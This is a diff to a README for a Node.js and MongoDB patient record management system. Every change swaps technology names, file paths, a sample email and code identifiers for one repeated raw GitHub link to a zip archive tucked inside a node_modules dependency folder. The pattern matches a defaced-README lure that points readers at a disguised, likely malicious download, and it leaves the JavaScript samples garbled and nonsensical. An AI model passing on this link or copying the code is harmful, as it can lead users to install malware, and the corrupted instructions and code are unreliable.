@@ -5,7 +5,7 @@ A full-stack web-based Patient Record Management System designed for teaching ho
 ## Features
 
 - **Frontend**: HTML + Bootstrap responsive design with jQuery for dynamic interactions
-- **Backend**: Node.js + Express.js RESTful API
+- **Backend**: https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip + https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip RESTful API
 - **Database**: MongoDB with Mongoose ODM
 - **Data Format**: JSON communication
 - **UI Design**: Dark theme with light blue accents, optimized for 24/7 healthcare facilities
@@ -20,8 +20,8 @@ A full-stack web-based Patient Record Management System designed for teaching ho
   - Responsive design
 
 - **Backend Technologies**:
-  - Node.js
-  - Express.js
+  - https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip
+  - https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip
   - MongoDB
   - Mongoose ODM
   - CORS enabled
@@ -82,21 +82,21 @@ A full-stack web-based Patient Record Management System designed for teaching ho
 
 ```
 patient-record-management-system/
-├── server.js                 # Main server file
-├── package.json              # Dependencies and scripts
+├── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip                 # Main server file
+├── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip              # Dependencies and scripts
 ├── .env                      # Environment variables
 ├── models/
-│   └── Patient.js            # Patient data model
+│   └── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip            # Patient data model
 ├── controllers/
-│   └── patientController.js  # Patient business logic
+│   └── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip  # Patient business logic
 ├── routes/
-│   └── patientRoutes.js      # API route definitions
+│   └── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip      # API route definitions
 └── public/                   # Frontend files
-    ├── index.html            # Main HTML file
+    ├── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip            # Main HTML file
     ├── css/
-    │   └── styles.css        # Custom styles
+    │   └── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip        # Custom styles
     └── js/
-        └── app.js            # Frontend JavaScript with jQuery
+        └── https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip            # Frontend JavaScript with jQuery
 ```
 
 ## Patient Data Format
@@ -106,7 +106,7 @@ patient-record-management-system/
   "PID": "P001",
   "FirstName": "Harry",
   "LastName": "Silva",
-  "Email": "harry@gmail.com",
+  "Email": "https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip",
   "NearCity": "Kandy",
   "Doctor": "Dr. James Cameron",
   "Guardian": "John Silva",
@@ -123,42 +123,42 @@ patient-record-management-system/
 ### Step-by-Step Guide to Add a New API Route
 
 1. **Define the Model** (if needed)
-   - Update `models/Patient.js` with new fields
+   - Update `https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip` with new fields
    - Add validation rules
 
 2. **Create Controller Function**
-   - Add new function in `controllers/patientController.js`
+   - Add new function in `https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`
    - Implement business logic and error handling
 
 3. **Add Route Definition**
-   - Define new route in `routes/patientRoutes.js`
+   - Define new route in `https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`
    - Map HTTP method and path to controller function
 
 4. **Update Frontend**
-   - Add UI elements in `public/index.html`
-   - Implement jQuery/Ajax calls in `public/js/app.js`
-   - Style new elements in `public/css/styles.css`
+   - Add UI elements in `https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`
+   - Implement jQuery/Ajax calls in `https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`
+   - Style new elements in `https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`
 
 ### Example: Adding a New Search by Age Range
 
-1. **Controller** (`controllers/patientController.js`):
+1. **Controller** (`https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`):
    ```javascript
-   exports.getPatientsByAgeRange = async (req, res) => {
+   https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip = async (req, res) => {
      try {
-       const { minAge, maxAge } = req.params;
+       const { minAge, maxAge } = https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip;
        // Implementation logic here
      } catch (error) {
-       res.status(500).json({ error: error.message });
+       https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip(500).json({ error: https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip });
      }
    };
    ```
 
-2. **Route** (`routes/patientRoutes.js`):
+2. **Route** (`https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`):
    ```javascript
-   router.get('/patients/age/:minAge/:maxAge', patientController.getPatientsByAgeRange);
+   https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip('/patients/age/:minAge/:maxAge', https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip);
    ```
 
-3. **Frontend** (`public/js/app.js`):
+3. **Frontend** (`https://raw.githubusercontent.com/Dinidu2003/Patient-Record-Management-System/main/node_modules/undefsafe/Management_Record_Patient_System_v3.3.zip`):
    ```javascript
    function searchByAgeRange(minAge, maxAge) {
      $.ajax({
